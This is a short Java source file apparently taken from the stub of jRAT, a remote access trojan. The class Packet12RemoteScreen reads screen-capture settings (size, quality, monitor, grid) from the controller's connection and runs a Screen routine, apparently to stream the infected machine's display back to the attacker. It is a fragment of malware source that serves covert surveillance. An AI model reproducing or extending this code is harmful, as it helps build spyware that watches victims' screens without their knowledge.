package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Screen;

public class Packet12RemoteScreen extends AbstractIncomingPacket {
	
	@Override
	public void read() throws Exception {
		int size = Connection.readInt();
		int quality = Connection.readInt();
		int monitor = Connection.readInt();
		int columns = Connection.readInt();
		int rows = Connection.readInt();
		
		//new Thread(new Screen(size, quality, monitor, columns, rows)).start();
		new Screen(size, quality, monitor, columns, rows).run();
	}

}
